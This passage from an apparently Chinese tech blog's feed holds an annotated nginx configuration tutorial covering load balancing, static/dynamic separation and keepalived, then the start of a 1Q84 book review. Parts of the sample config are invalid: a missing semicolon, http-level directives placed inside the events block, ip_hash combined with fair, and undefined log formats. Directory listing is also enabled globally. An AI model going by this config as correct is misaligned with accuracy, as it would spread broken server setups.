class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定进程可以打开的最大描述符：数目</span></span><br><span class="line"><span class="comment">#工作模式与连接数上限</span></span><br><span class="line"><span class="comment">##这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。</span></span><br><span class="line"><span class="comment">#这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。</span></span><br><span class="line"><span class="attribute">worker_rlimit_nofile</span> <span class="number">65535</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="comment">#参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型</span></span><br><span class="line">    <span class="comment">#是Linux 2.6以上版本内核中的高性能网络I/O模型，linux建议epoll，如果跑在FreeBSD上面，就用kqueue模型。</span></span><br><span class="line">    <span class="comment">#补充说明：</span></span><br><span class="line">    <span class="comment">#与apache相类，nginx针对不同的操作系统，有不同的事件模型</span></span><br><span class="line">    <span class="comment">#A）标准事件模型</span></span><br><span class="line">    <span class="comment">#Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或poll</span></span><br><span class="line">    <span class="comment">#B）高效事件模型</span></span><br><span class="line">    <span class="comment">#Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。</span></span><br><span class="line">    <span class="comment">#Epoll：使用于Linux内核2.6版本及以后的系统。</span></span><br><span class="line">    <span class="comment">#/dev/poll：使用于Solaris 7 11/99+，HP/UX 11.22+ (eventport)，IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。</span></span><br><span class="line">    <span class="comment">#Eventport：使用于Solaris 10。 为了防止出现内核崩溃的问题， 有必要安装安全补丁。</span></span><br><span class="line">    <span class="attribute">use</span> <span class="literal">epoll</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#单个进程最大连接数（最大连接数=连接数+进程数）</span></span><br><span class="line">    <span class="comment">#根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cup跑到100%就行。</span></span><br><span class="line">    worker_connections  <span class="number">1024</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#keepalive 超时时间</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">60</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求头的大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。</span></span><br><span class="line">    <span class="comment">#分页大小可以用命令getconf PAGESIZE 取得。</span></span><br><span class="line">    <span class="comment">#[root@web001 ~]# getconf PAGESIZE</span></span><br><span class="line">    <span class="comment">#但也有client_header_buffer_size超过4k的情况，但是client_header_buffer_size该值必须设置为“系统分页大小”的整倍数。</span></span><br><span class="line">    <span class="attribute">client_header_buffer_size</span> <span class="number">4k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。</span></span><br><span class="line">    <span class="attribute">open_file_cache</span> max=<span class="number">65535</span> inactive=<span class="number">60s</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#这个是指多长时间检查一次缓存的有效信息。</span></span><br><span class="line">    <span class="comment">#语法:open_file_cache_valid time 默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息.</span></span><br><span class="line">    <span class="attribute">open_file_cache_valid</span> <span class="number">80s</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如上例，如果有一个文件在inactive时间内一次没被使用，它将被移除。</span></span><br><span class="line">    <span class="comment">#语法:open_file_cache_min_uses number 默认值:open_file_cache_min_uses 1 使用字段:http, server, location  这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如果使用更大的值,文件描述符在cache中总是打开状态.</span></span><br><span class="line">    <span class="attribute">open_file_cache_min_uses</span> <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#语法:open_file_cache_errors on | off 默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误.</span></span><br><span class="line">    <span class="attribute">open_file_cache_errors</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#设定http服务器，利用它的反向代理功能提供负载均衡支持</span></span><br><span class="line">http&#123;</span><br><span class="line">    <span class="comment">#文件扩展名与文件类型映射表</span></span><br><span class="line">    <span class="attribute">include</span> mime.types;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#默认文件类型</span></span><br><span class="line">    <span class="attribute">default_type</span> application/octet-stream;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#默认编码</span></span><br><span class="line">    <span class="attribute">charset</span> utf-<span class="number">8</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#服务器名字的hash表大小</span></span><br><span class="line">    <span class="comment">#保存服务器名字的hash表是由指令server_names_hash_max_size 和server_names_hash_bucket_size所控制的。参数hash bucket size总是等于hash表的大小，并且是一路处理器缓存大小的倍数。在减少了在内存中的存取次数后，使在处理器中加速查找hash表键值成为可能。如果hash bucket size等于一路处理器缓存的大小，那么在查找键的时候，最坏的情况下在内存中查找的次数为2。第一次是确定存储单元的地址，第二次是在存储单元中查找键 值。因此，如果Nginx给出需要增大hash max size 或 hash bucket size的提示，那么首要的是增大前一个参数的大小.</span></span><br><span class="line">    <span class="attribute">server_names_hash_bucket_size</span> <span class="number">128</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般一个请求的头部大小不会超过1k，不过由于一般系统分页都要大于1k，所以这里设置为分页大小。分页大小可以用命令getconf PAGESIZE取得。</span></span><br><span class="line">    <span class="attribute">client_header_buffer_size</span> <span class="number">32k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。</span></span><br><span class="line">    <span class="attribute">large_client_header_buffers</span> <span class="number">4</span> <span class="number">64k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设定通过nginx上传文件的大小</span></span><br><span class="line">    <span class="attribute">client_max_body_size</span> <span class="number">8m</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。</span></span><br><span class="line">    <span class="comment">#sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。</span></span><br><span class="line">    <span class="attribute">sendfile</span> <span class="literal">on</span>;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">#开启目录列表访问，合适下载服务器，默认关闭。</span></span><br><span class="line">    <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    </span><br><span class="line">      <span class="comment">#此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用</span></span><br><span class="line">    <span class="attribute">tcp_nopush</span> <span class="literal">on</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="attribute">tcp_nodelay</span> <span class="literal">on</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#长连接超时时间，单位是秒</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">120</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。</span></span><br><span class="line">    <span class="attribute">fastcgi_connect_timeout</span> <span class="number">300</span>;</span><br><span class="line">    <span class="attribute">fastcgi_send_timeout</span> <span class="number">300</span>;</span><br><span class="line">    <span class="attribute">fastcgi_read_timeout</span> <span class="number">300</span>;</span><br><span class="line">    <span class="attribute">fastcgi_buffer_size</span> <span class="number">64k</span>;</span><br><span class="line">    <span class="attribute">fastcgi_buffers</span> <span class="number">4</span> <span class="number">64k</span>;</span><br><span class="line">    <span class="attribute">fastcgi_busy_buffers_size</span> <span class="number">128k</span>;</span><br><span class="line">    <span class="attribute">fastcgi_temp_file_write_size</span> <span class="number">128k</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gzip模块设置</span></span><br><span class="line">    <span class="attribute">gzip</span> <span class="literal">on</span>; <span class="comment">#开启gzip压缩输出</span></span><br><span class="line">    <span class="attribute">gzip_min_length</span> <span class="number">1k</span>;    <span class="comment">#最小压缩文件大小</span></span><br><span class="line">    <span class="attribute">gzip_buffers</span> <span class="number">4</span> <span class="number">16k</span>;    <span class="comment">#压缩缓冲区</span></span><br><span class="line">    <span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">0</span>; <span class="comment">#压缩版本（默认1.1，前端如果是squid2.5请使用1.0）</span></span><br><span class="line">    <span class="attribute">gzip_comp_level</span> <span class="number">2</span>;     <span class="comment">#压缩等级</span></span><br><span class="line">    <span class="attribute">gzip_types</span> text/plain application/x-javascript text/css application/xml;    <span class="comment">#压缩类型，默认就已经包含textml，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。</span></span><br><span class="line">    <span class="attribute">gzip_vary</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#开启限制IP连接数的时候需要使用</span></span><br><span class="line">    <span class="comment">#limit_zone crawler $binary_remote_addr 10m;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#负载均衡配置</span></span><br><span class="line">    <span class="attribute">upstream</span> piao.jd.com &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="comment">#upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。</span></span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.80.121:80</span> weight=<span class="number">3</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.80.122:80</span> weight=<span class="number">2</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">192.168.80.123:80</span> weight=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#nginx的upstream目前支持4种方式的分配</span></span><br><span class="line">        <span class="comment">#1、轮询（默认）</span></span><br><span class="line">        <span class="comment">#每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。</span></span><br><span class="line">        <span class="comment">#2、weight</span></span><br><span class="line">        <span class="comment">#指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。</span></span><br><span class="line">        <span class="comment">#例如：</span></span><br><span class="line">        <span class="comment">#upstream bakend &#123;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.14 weight=10;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.15 weight=10;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#2、ip_hash</span></span><br><span class="line">        <span class="comment">#每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。</span></span><br><span class="line">        <span class="comment">#例如：</span></span><br><span class="line">        <span class="comment">#upstream bakend &#123;</span></span><br><span class="line">        <span class="comment">#    ip_hash;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.14:88;</span></span><br><span class="line">        <span class="comment">#    server 192.168.0.15:80;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#3、fair（第三方）</span></span><br><span class="line">        <span class="comment">#按后端服务器的响应时间来分配请求，响应时间短的优先分配。</span></span><br><span class="line">        <span class="comment">#upstream backend &#123;</span></span><br><span class="line">        <span class="comment">#    server server1;</span></span><br><span class="line">        <span class="comment">#    server server2;</span></span><br><span class="line">        <span class="comment">#    fair;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#4、url_hash（第三方）</span></span><br><span class="line">        <span class="comment">#按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。</span></span><br><span class="line">        <span class="comment">#例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法</span></span><br><span class="line">        <span class="comment">#upstream backend &#123;</span></span><br><span class="line">        <span class="comment">#    server squid1:3128;</span></span><br><span class="line">        <span class="comment">#    server squid2:3128;</span></span><br><span class="line">        <span class="comment">#    hash $request_uri;</span></span><br><span class="line">        <span class="comment">#    hash_method crc32;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#tips:</span></span><br><span class="line">        <span class="comment">#upstream bakend&#123;#定义负载均衡设备的Ip及设备状态&#125;&#123;</span></span><br><span class="line">        <span class="comment">#    ip_hash;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:9090 down;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:8080 weight=2;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:6060;</span></span><br><span class="line">        <span class="comment">#    server 127.0.0.1:7070 backup;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">        <span class="comment">#在需要使用负载均衡的server中增加 proxy_pass http://bakend/;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#每个设备的状态设置为:</span></span><br><span class="line">        <span class="comment">#1.down表示单前的server暂时不参与负载</span></span><br><span class="line">        <span class="comment">#2.weight为weight越大，负载的权重就越大。</span></span><br><span class="line">        <span class="comment">#3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误</span></span><br><span class="line">        <span class="comment">#4.fail_timeout:max_fails次失败后，暂停的时间。</span></span><br><span class="line">        <span class="comment">#5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#nginx支持同时设置多组的负载均衡，用来给不用的server来使用。</span></span><br><span class="line">        <span class="comment">#client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debug</span></span><br><span class="line">        <span class="comment">#client_body_temp_path设置记录文件的目录 可以设置最多3层目录</span></span><br><span class="line">        <span class="comment">#location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#虚拟主机的配置</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="comment">#监听端口</span></span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#域名可以有多个，用空格隔开</span></span><br><span class="line">        <span class="attribute">server_name</span> www.jd.com jd.com;</span><br><span class="line">        <span class="comment">#默认入口文件名称</span></span><br><span class="line">        <span class="attribute">index</span> index.html index.htm index.php;</span><br><span class="line">        <span class="attribute">root</span> /data/www/jd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#对******进行负载均衡</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .*.(php|php5)?$</span></span><br><span class="line"><span class="regexp"></span>        &#123;</span><br><span class="line">            <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">            <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">            <span class="attribute">include</span> fastcgi.conf;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#图片缓存时间设置</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .*.(gif|jpg|jpeg|png|bmp|swf)$</span></span><br><span class="line"><span class="regexp"></span>        &#123;</span><br><span class="line">            <span class="attribute">expires</span> <span class="number">10d</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#JS和CSS缓存时间设置</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .*.(js|css)?$</span></span><br><span class="line"><span class="regexp"></span>        &#123;</span><br><span class="line">            <span class="attribute">expires</span> <span class="number">1h</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#日志格式设定</span></span><br><span class="line">        <span class="comment">#$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址；</span></span><br><span class="line">        <span class="comment">#$remote_user：用来记录客户端用户名称；</span></span><br><span class="line">        <span class="comment">#$time_local： 用来记录访问时间与时区；</span></span><br><span class="line">        <span class="comment">#$request： 用来记录请求的url与http协议；</span></span><br><span class="line">        <span class="comment">#$status： 用来记录请求状态；成功是200，</span></span><br><span class="line">        <span class="comment">#$body_bytes_sent ：记录发送给客户端文件主体内容大小；</span></span><br><span class="line">        <span class="comment">#$http_referer：用来记录从那个页面链接访问过来的；</span></span><br><span class="line">        <span class="comment">#$http_user_agent：记录客户浏览器的相关信息；</span></span><br><span class="line">        <span class="comment">#通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址。</span></span><br><span class="line">        <span class="attribute">log_format</span> access <span class="string">'<span class="variable">$remote_addr</span> - <span class="variable">$remote_user</span> [<span class="variable">$time_local</span>] "<span class="variable">$request</span>" '</span></span><br><span class="line">        <span class="string">'<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span> "<span class="variable">$http_referer</span>" '</span></span><br><span class="line">        <span class="string">'"<span class="variable">$http_user_agent</span>" <span class="variable">$http_x_forwarded_for</span>'</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#定义本虚拟主机的访问日志</span></span><br><span class="line">        <span class="attribute">access_log</span>  /usr/local/nginx/logs/host.access.log  main;</span><br><span class="line">        <span class="attribute">access_log</span>  /usr/local/nginx/logs/host.access.<span class="number">404</span>.log  log404;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">#对 "/connect-controller" 启用反向代理</span></span><br><span class="line">        <span class="attribute">location</span> /connect-controller &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:88; <span class="comment">#请注意此处端口号不能与虚拟主机监听的端口号一样（也就是server监听的端口）</span></span><br><span class="line">            <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">             </span><br><span class="line">            <span class="comment">#后端的Web服务器可以通过X-Forwarded-For获取用户真实IP</span></span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">             </span><br><span class="line">            <span class="comment">#以下是一些反向代理的配置，可选。</span></span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#允许客户端请求的最大单文件字节数</span></span><br><span class="line">            <span class="attribute">client_max_body_size</span> <span class="number">10m</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#缓冲区代理缓冲用户端请求的最大字节数，</span></span><br><span class="line">            <span class="comment">#如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。</span></span><br><span class="line">            <span class="comment">#无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误</span></span><br><span class="line">            <span class="attribute">client_body_buffer_size</span> <span class="number">128k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#表示使nginx阻止HTTP应答代码为400或者更高的应答。</span></span><br><span class="line">            <span class="attribute">proxy_intercept_errors</span> <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#后端服务器连接的超时时间_发起握手等候响应超时时间</span></span><br><span class="line">            <span class="comment">#nginx跟后端服务器连接超时时间(代理连接超时)</span></span><br><span class="line">            <span class="attribute">proxy_connect_timeout</span> <span class="number">90</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#后端服务器数据回传时间(代理发送超时)</span></span><br><span class="line">            <span class="comment">#后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据</span></span><br><span class="line">            <span class="attribute">proxy_send_timeout</span> <span class="number">90</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#连接成功后，后端服务器响应时间(代理接收超时)</span></span><br><span class="line">            <span class="comment">#连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）</span></span><br><span class="line">            <span class="attribute">proxy_read_timeout</span> <span class="number">90</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#设置代理服务器（nginx）保存用户头信息的缓冲区大小</span></span><br><span class="line">            <span class="comment">#设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小</span></span><br><span class="line">            <span class="attribute">proxy_buffer_size</span> <span class="number">4k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#proxy_buffers缓冲区，网页平均在32k以下的设置</span></span><br><span class="line">            <span class="comment">#设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k</span></span><br><span class="line">            <span class="attribute">proxy_buffers</span> <span class="number">4</span> <span class="number">32k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#高负荷下缓冲大小（proxy_buffers*2）</span></span><br><span class="line">            <span class="attribute">proxy_busy_buffers_size</span> <span class="number">64k</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长</span></span><br><span class="line">            <span class="comment">#设定缓存文件夹大小，大于这个值，将从upstream服务器传</span></span><br><span class="line">            <span class="attribute">proxy_temp_file_write_size</span> <span class="number">64k</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#本地动静分离反向代理配置</span></span><br><span class="line">        <span class="comment">#所有jsp的页面均交由tomcat或resin处理</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ .(jsp|jspx|do)?$</span> &#123;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="nginx配置实例-反向代理"><a class="markdownIt-Anchor" href="#nginx配置实例-反向代理"></a> Nginx配置实例-反向代理</h2>
<p>在Nginx配置文件中将location中的位置改为所要展示的页面的绝对地址，或者使用proxy_pass改为所要跳转的端口。</p>
<h2 id="nginx配置实例-负载均衡"><a class="markdownIt-Anchor" href="#nginx配置实例-负载均衡"></a> Nginx配置实例-负载均衡</h2>
<p>**实现效果：**浏览器地址栏输入地址，负载均衡效果，平均到8080和8081端口中。</p>
<p><strong>在nginx配置文件中进行负载均衡的配置：</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">......</span><br><span class="line">	<span class="attribute">upstream</span> myserver&#123;</span><br><span class="line">		ip_hash;</span><br><span class="line">		<span class="attribute">server</span> <span class="number">115.28.52.63:8080</span> weight=<span class="number">1</span>;</span><br><span class="line">		<span class="attribute">server</span> <span class="number">115.28.52.63:8081</span> weight=<span class="number">1</span>;</span><br><span class="line">        fair;</span><br><span class="line">	&#125;</span><br><span class="line">	server&#123;</span><br><span class="line">		location/&#123;</span><br><span class="line">			......</span><br><span class="line">			<span class="attribute">proxy_pass</span> http://myserver;</span><br><span class="line">			<span class="attribute">proxy_connect_timeout</span> <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Nginx提供了几种分配方式（策略）：</p>
<p><strong>1.轮询（默认）：</strong></p>
<p>每个请求按时间顺序逐一分配到不同的的后端服务器，如果后端服务器宕机，能自动剔除。</p>
<p><strong>2.weight：</strong></p>
<p>weight代表权重，默认为1，权重越高被分配的客户端越多。</p>
<p><strong>3.ip_hash:</strong></p>
<p>每个请求按访问ip的hash的结果分配，这样每一个访客固定访问一个后端服务器，可以解决session问题。</p>
<p><strong>4.fair（第三方）：</strong></p>
<p>按后端服务器的响应时间来分配请求，响应时间短的优先分配。</p>
<h2 id="nginx配置实例-动静分离"><a class="markdownIt-Anchor" href="#nginx配置实例-动静分离"></a> Nginx配置实例-动静分离</h2>
<p>Nginx动静分离简单来说就是把动态跟静态请求分开，不能理解成只是单纯的把动态页面和静态页面物理分离，严格意义上说应该是动态请求和静态请求分开。动静分离从目前实现角度来讲大致分为两种：</p>
<p>一种是纯粹把静态文件独立成单独的域名，放在独立的服务器上，也是目前主流推崇的方案。</p>
<p>另外一种方法就是把动态和静态页面混合在一起发布，通过nginx来分开。</p>
<p><strong>在配置文件中进行分离配置：</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /www/ &#123;</span><br><span class="line">	<span class="attribute">root</span> /data/;</span><br><span class="line">	<span class="attribute">index</span> index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> /image/ &#123;</span><br><span class="line">	<span class="attribute">root</span> /data/;</span><br><span class="line">	<span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="nginx配置实例-高可用"><a class="markdownIt-Anchor" href="#nginx配置实例-高可用"></a> Nginx配置实例-高可用</h2>
<p>**高可用：**需要多台nginx服务器（防止nginx宕机），需安装keepalived</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install keepalived -y</span><br></pre></td></tr></table></figure>
<p>在/etc里面生成目录keepalived，有配置文件keepalived.conf</p>
<p>在/usr/local/src添加检测脚本文件。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>后端开发</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>1Q84</title>
    <url>/2020/06/21/1/</url>
    <content><![CDATA[<p>这几天看完了三册共近百万字的《1Q84》，说实话并没有怎么看懂,因为作者在其中有很多谜团都没有解释清楚。比如大川奈天吾十岁的女朋友为什么突然“丧失了”，中野亚由美的死因到底是意外死亡还是有人蓄意地谋杀，小小人和空气蛹到底是怎么样的存在，它们对这个世界想要做些什么。这些作者都没有给我们一个清楚的答案。</p>
<a id="more"></a>
<p>从书名可以看出本书是致敬乔治奥威尔的《1984》，但同《1984》的不同之处在于《1984》致力于构造一个外化的、政治色彩的反乌托邦世界，在那里“老大哥”扮演着政治首脑，他（们）致力于监视民众的行为，对民众的思想进行“净化”。而在本书里则更关心人的内心世界，它从表面上看和真实世界无异，只不过，它把很多原本内化于人心之中的东西变的更为具象了，比如小小人，空气蛹，天吾父亲的“意识”变成了NHK职员。</p>
<p>青豆本身以为自己是误入了1Q84世界，但后来在刺杀“先驱”领袖的时候被告知自己进入这个世界是必然的事情，后面又反复提到“这就像一个无限的悖论，自己的意识包含着世界，而这个世界又包含着自己的意识”。毫无疑问地是，在这个故事中好像每一个人都不是那么的快乐，青豆和天吾拥有着不幸的童年，青豆的父母都是证人会的教徒，他们对青豆进行严苛的不近人情的要求，迫使她失去了童年；而天吾的父亲每周末都要带他去收NHK电视费，丧失了他自由活动的时间；牛河因为丑陋的外貌而不被人喜欢并且遭到了妻子的背叛。</p>
<p>在来到这个世界之前，青豆和天吾从来未想到去互相寻找对方，追寻自己的爱情，青豆一直想的是“能够在某一条街道偶遇川奈天吾”，这固然是一件浪漫的事情，但细想起来好像也不那么现实，在进到这个世界前，他们都以为自己只是一厢情愿，或许对方连自己的样子都记不清了，他们只是将自己关在一个房间里，那里没有门，也没有窗户，别人进不来，他们也出不去，尽管被称为“神童”并且拥有着美好的光明前途的时候，他们好像对一切都漠不关心，放弃了拼搏的动力，仅仅甘心于做一名补习课老师和体育教练，这样独自一个人，孤身，却并没有感到怎么孤独，好像也不错，但却丧失了生命的意义。</p>
<p>村上春树善于使用隐喻的手法，在这里“小小人”和“空气蛹”看起来可爱、无害，却是邪恶的代表。在我看来，这更像是心灵里邪恶的那面，它们无法攻击你本身，却可以攻击你身边的人，使人的亲人、朋友一个接一个的“丧失”，在“1Q84”世界里的丧失，在现实世界中不如说因为一个人封闭的灵魂而逐渐同社会脱节，同亲人朋友的关系逐渐冷漠。<br>
